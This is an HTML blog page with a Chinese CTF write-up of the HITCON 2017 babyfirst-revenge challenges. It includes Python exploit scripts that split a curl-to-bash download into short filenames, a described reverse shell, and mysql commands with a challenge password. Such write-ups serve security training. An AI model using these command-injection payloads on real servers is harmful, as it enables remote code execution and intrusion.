@@ -1,0 +1,495 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>HITCON-2017-babyfirst-revenge-v1&amp;v2 复现 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="HITCON-2017-babyfirst-revenge-v1&v2 复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-10-31 16:35" pubdate>
+        2018年10月31日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HITCON-2017-babyfirst-revenge-v1&amp;v2 复现</h1>
+            
+            <div class="markdown-body">
+              <p>i春秋CTF训练营 HITCON CTF 2017 的Web题 babyfirst-revenge 和 babyfirst-revenge v2 复现。</p>
+<a id="more"></a>
+
+<h2 id="1-babyfirst-revenge"><a href="#1-babyfirst-revenge" class="headerlink" title="1. babyfirst-revenge"></a>1. babyfirst-revenge</h2><h3 id="1-1-题目代码"><a href="#1-1-题目代码" class="headerlink" title="1.1 题目代码"></a>1.1 题目代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    @mkdir(<span class="hljs-variable">$sandbox</span>);<br>    @chdir(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &lt;= <span class="hljs-number">5</span>) &#123;<br>        @exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        @exec(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+<p>题目使用<code>sandbox</code>给每个访问题目的用户提供了一个单独的环境，能执行长度小于等于5的命令，看起来目的就是<code>getshell</code>。</p>
+<h3 id="1-2-题解"><a href="#1-2-题解" class="headerlink" title="1.2 题解"></a>1.2 题解</h3><p>在本题中，执行命令的长度被限制到了5个字符，直接执行命令也没有回显，因此得想办法写一个php马或者反弹一个shell出来。</p>
+<p>Linux的Trick：</p>
+<ol>
+<li>命令能够使用<code>\</code>来换行续写。</li>
+<li>文件中当前命令错误不会影响后续命令的执行。</li>
+</ol>
+<p>如图所示：</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>第3行<code>asd</code>并不是一个命令，脚本虽然报错了，但后面的<code>echo</code>语句还是正常执行了，而且在第4行末尾，添加了一个<code>\</code>,脚本自动将其与第5行连接，并且执行了<code>echo &quot;Go on&quot;</code>命令。</p>
+<p>因此有了一个思路，将所要执行的命令分解成片段并作为文件名，在命令片段末尾添加<code>\</code>最后使用<code>ls&gt;x</code>将其输出到文件<code>x</code>中。</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>如图所示，<code>date</code>命令成功执行了。</p>
+<p>但是还有一个问题，我们都知道，<code>ls</code>的命令结果默认是以字典序进行排序的，到最后很难构造出要执行的命令，不过<code>ls</code>有个<code>-t</code>参数，来将文件基于时间排序，越晚创建的，越排在前面。</p>
+<blockquote>
+<p>-t     sort by modification time, newest first</p>
+</blockquote>
+<p>因此我们可以构造命令<code>ls -t&gt;b</code>。这样就能按照时间顺序将命令存储到文件中。接下来构造这个命令。</p>
+<p>该命令长7个字符，分割命令，每次执行命令的最大长度是5，除去<code>&gt;</code>和<code>\</code>，最多一部分3个字符。</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>可以看到，通过两次<code>ls</code>拼接，第4-7行组成了命令<code>ls -t&gt;b</code>。</p>
+<p>接下来就是相同的套路，来构造一个<code>curl</code>请求，将VPS上的存有命令的文件下载下来，然后执行即可。</p>
+<h3 id="1-3-执行脚本"><a href="#1-3-执行脚本" class="headerlink" title="1.3 执行脚本"></a>1.3 执行脚本</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://117.50.3.97:8001/index.php&quot;</span><br><br>payload <span class="hljs-operator">=</span> [<br>	<span class="hljs-string">&quot;&gt;-t<span class="hljs-subst">\\</span>&quot;</span>, # ls <span class="hljs-operator">-</span>t<span class="hljs-operator">&gt;</span>b<br>	<span class="hljs-string">&quot;&gt;\&gt;b&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;l<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;s\ <span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;ls&gt;a&quot;</span>,<br>	<span class="hljs-string">&quot;ls&gt;&gt;a&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;bash&quot;</span>, # <span class="hljs-type">Download</span> <span class="hljs-type">Payload</span><br>	<span class="hljs-string">&quot;&gt;8\|<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;15<span class="hljs-subst">\\</span>&quot;</span>, <br>	<span class="hljs-string">&quot;&gt;31.<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;99.<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;9.1<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;13<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;\ <span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;rl<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;cu<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;sh a&quot;</span>,<br>	<span class="hljs-string">&quot;sh b&quot;</span>,<br>]<br>r <span class="hljs-operator">=</span> requests.get(url<span class="hljs-operator">+</span><span class="hljs-string">&quot;?reset=1&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>	print i<br>	time.sleep(<span class="hljs-number">0.5</span>)<br>	r <span class="hljs-operator">=</span> requests.get(url <span class="hljs-operator">+</span> <span class="hljs-string">&quot;?cmd=&quot;</span> <span class="hljs-operator">+</span> i)<br></code></pre></td></tr></table></figure>
+<p>在VPS上放个bash反弹shell的命令，然后直接在VPS上监听对应的端口，脚本执行完毕后即可获得shell。</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>在<code>home</code>目录中，找到<code>fl4444g</code>目录，在README文档中，找到提示，flag在数据库中。</p>
+<p>在shell中，不能直接使用mysql连接数据库进行交互，可以使用<code>-e</code>参数来执行SQL语句。来一个三连XD</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> -ufl<span class="hljs-number">4444</span>g -pSugZXUtgeJ<span class="hljs-number">52</span>_Bvr -e <span class="hljs-string">&quot;show databases;&quot;</span> &gt; database.txt<br><span class="hljs-attribute">mysql</span> -ufl<span class="hljs-number">4444</span>g -pSugZXUtgeJ<span class="hljs-number">52</span>_Bvr -e <span class="hljs-string">&quot;use fl4gdb;show tables;&quot;</span> &gt; <span class="hljs-number">1</span>.txt<br><span class="hljs-attribute">mysql</span> -ufl<span class="hljs-number">4444</span>g -pSugZXUtgeJ<span class="hljs-number">52</span>_Bvr -e <span class="hljs-string">&quot;use fl4gdb;select * from this_is_the_fl4g;&quot;</span> &gt; <span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/5.png" srcset="/img/loading.gif" alt="5"></p>
+<h2 id="2-babyfirst-revengev2"><a href="#2-babyfirst-revengev2" class="headerlink" title="2. babyfirst-revengev2"></a>2. babyfirst-revengev2</h2><h3 id="2-1-题目代码"><a href="#2-1-题目代码" class="headerlink" title="2.1 题目代码"></a>2.1 题目代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    @mkdir(<span class="hljs-variable">$sandbox</span>);<br>    @chdir(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &lt;= <span class="hljs-number">4</span>) &#123;<br>        @exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        @exec(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+<p>与第一个题目的差别不大，就是命令执行的字符长度更短了，最大长度变成了4个字符。</p>
+<h3 id="2-2-题解"><a href="#2-2-题解" class="headerlink" title="2.2 题解"></a>2.2 题解</h3><p>与第一题思路类似，得想办法构造<code>ls -t&gt;b</code>命令。但是第一题中使用了<code>ls&gt;&gt;a</code>命令，在这个题中就不能用了。</p>
+<p>这里需要linux的另一个小tricks。</p>
+<p>在linux的shell中，我们一般使用<code>*</code>作为通配符使用。如图所示：</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>在目录中单独一个<code>*</code>，linux会把当前目录下的所有文件名按照字典序排序，然后作为命令执行，图中就成功执行了命令<code>echo zxc</code>。</p>
+<p>因为字符限制为4，<code>ls&gt;&gt;?</code>命令不能使用了，可以使用<code>rev</code>命令进行逆序。<code>ls -t&gt;g</code>这个命令逆序也不能实现，因为<code>t</code>在字典序中是比<code>s</code>大。如果是逆序的话，需要一个比<code>s</code>小的字母。在<code>ls</code>中有个参数<code>-h</code>，它与<code>-l</code>一起使用，使输出更加具有可读性。与其他参数一起则没有影响。因此可以构造<code>ls -th&gt;g</code></p>
+<blockquote>
+<p>-h, –human-readable<br>​              with -l, print sizes in human readable format (e.g., 1K 234M 2G)</p>
+</blockquote>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>而且在一般linux系统中，<code>ls</code>命令一般有一个别名<code>dir</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">dir</span><br><span class="hljs-meta">&gt;</span><span class="bash">sl</span><br><span class="hljs-meta">&gt;</span><span class="bash">g\&gt;</span><br><span class="hljs-meta">&gt;</span><span class="bash">ht-</span><br></code></pre></td></tr></table></figure>
+<p>这样执行的话，直接执行一个<code>*</code>，相当于执行<code>dir g&gt; ht- sl</code>。</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/8.png" srcset="/img/loading.gif" alt="8"></p>
+<p>再想办法将其逆序就好了，使用<code>rev</code>命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">v</span><br><span class="hljs-meta">&gt;</span><span class="bash">rev</span><br>*v&gt;x<br></code></pre></td></tr></table></figure>
+<p>当目录中存在<code>rev</code>和<code>v</code>两个文件时，使用<code>*v</code>相当于<code>rev v</code>，也就是对<code>v</code>的内容进行逆序。然后<code>&gt;x</code>将内容输出到<code>x</code>文件中。</p>
+<p><img src="https://image.mengsec.com/HITCON-2017-babyfirst-revenge/9.png" srcset="/img/loading.gif" alt="9"></p>
+<p>由此成功构造出命令<code>ls -th&gt;g</code>命令。后面的curl VPS上的命令就与第一题没什么区别了，IP也可以转换成10进制来绕过<code>.</code>的限制。</p>
+<h3 id="2-3-执行脚本"><a href="#2-3-执行脚本" class="headerlink" title="2.3 执行脚本"></a>2.3 执行脚本</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://117.50.3.97:8002/index.php&quot;</span><br><br>payload <span class="hljs-operator">=</span> [<br>	<span class="hljs-string">&quot;&gt;dir&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;sl&quot;</span>, <br>	<span class="hljs-string">&quot;&gt;g\&gt;&quot;</span>,  <br>	<span class="hljs-string">&quot;&gt;ht-&quot;</span>,<br>	<span class="hljs-string">&quot;*&gt;v&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;rev&quot;</span>,<br>	<span class="hljs-string">&quot;*v&gt;x&quot;</span>, # ls <span class="hljs-operator">-</span>th<span class="hljs-operator">&gt;</span>g<br>	<span class="hljs-string">&quot;&gt;sh&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;ba<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;\|<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;32<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;1<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;9.<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;2<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;8.<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;16<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;4.<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;10<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;\ <span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;rl<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;&gt;cu<span class="hljs-subst">\\</span>&quot;</span>,<br>	<span class="hljs-string">&quot;sh x&quot;</span>,<br>	<span class="hljs-string">&quot;sh g&quot;</span><br>]<br>r <span class="hljs-operator">=</span> requests.get(url<span class="hljs-operator">+</span><span class="hljs-string">&quot;?reset=1&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>	print i<br>	time.sleep(<span class="hljs-number">0.5</span>)<br>	r <span class="hljs-operator">=</span> requests.get(url <span class="hljs-operator">+</span> <span class="hljs-string">&quot;?cmd=&quot;</span> <span class="hljs-operator">+</span> i)<br></code></pre></td></tr></table></figure>
+<p>拿shell找flag就不再赘述了。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/11/29/2018-6-1-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2018.6.1-铁人三项赛数据赛数据包分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/10/20/CTF-Volatility/">
+                        <span class="hidden-mobile">使用Volatility解决CTF取证类题目</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
